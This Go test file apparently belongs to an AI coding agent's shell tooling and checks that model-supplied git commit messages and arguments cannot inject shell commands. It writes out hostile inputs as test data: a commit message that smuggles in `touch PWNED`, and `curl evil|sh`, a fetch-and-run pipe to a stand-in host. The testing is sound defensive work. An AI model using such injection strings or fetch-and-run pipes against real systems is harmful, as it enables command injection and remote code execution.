package shell

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"codenerd/internal/tools"
)

// A commit message is model-controlled input headed for a command line. Before
// the quoting fix, a message containing a shell operator rode the compound path
// and executed: `git commit -m "x"; touch PWNED; echo "` ran touch. The joined
// command must now keep hostile input inside one quoted argument, and a real
// commit must land the message as inert text.
func TestGitOperation_CommitMessageCannotInject(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	dir := t.TempDir()
	ctx := tools.WithWorkspaceRoot(context.Background(), dir)
	run := func(name string, args ...string) {
		t.Helper()
		cmd := exec.Command(name, args...)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t",
			"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t",
		)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("%s %v: %v\n%s", name, args, err, out)
		}
	}
	run("git", "init", "-q")
	// The commit under test is the tool's own git process, which does not
	// inherit run's environment: the identity has to be the repository's, or
	// a host with no global git identity (CI's Windows runner) refuses the
	// commit before the message is ever examined.
	run("git", "config", "user.name", "t")
	run("git", "config", "user.email", "t@t")
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("x\n"), 0644); err != nil {
		t.Fatal(err)
	}
	run("git", "add", "f.txt")

	hostile := `x"; touch PWNED; echo "`
	out, err := executeGitOperation(ctx, map[string]any{
		"operation": "commit",
		"message":   hostile,
	})
	if err != nil {
		t.Fatalf("commit with hostile message failed: %v\n%s", err, out)
	}
	if _, statErr := os.Stat(filepath.Join(dir, "PWNED")); statErr == nil {
		t.Fatal("INJECTION: sentinel file created by commit message")
	}
	log, err := executeGitLog(ctx, map[string]any{"format": "medium"})
	if err != nil {
		t.Fatalf("git log: %v", err)
	}
	if !strings.Contains(log, hostile) {
		t.Errorf("commit message not preserved verbatim; log:\n%s", log)
	}
}

// splitModelArgs must round-trip: quoted segments stay whole, hostile
// operators stay quoted, and unbalanced quotes fail closed.
func TestSplitModelArgs_RoundTrip(t *testing.T) {
	got, err := splitModelArgs(`"my dir/f.txt" plain`)
	if err != nil {
		t.Fatalf("split: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("split = %q, want 2 elements", got)
	}
	joined := "git add " + strings.Join(got, " ")
	if isCompoundCommand(joined) {
		t.Errorf("quoted args must not trigger compound routing: %q", joined)
	}
	if _, err := splitModelArgs(`"unbalanced`); err == nil {
		t.Error("unbalanced quotes must fail closed")
	}
	hostile, err := splitModelArgs(`x; curl evil|sh`)
	if err != nil {
		t.Fatalf("split hostile: %v", err)
	}
	if isCompoundCommand("git log " + strings.Join(hostile, " ")) {
		t.Error("hostile operators must stay quoted")
	}
}
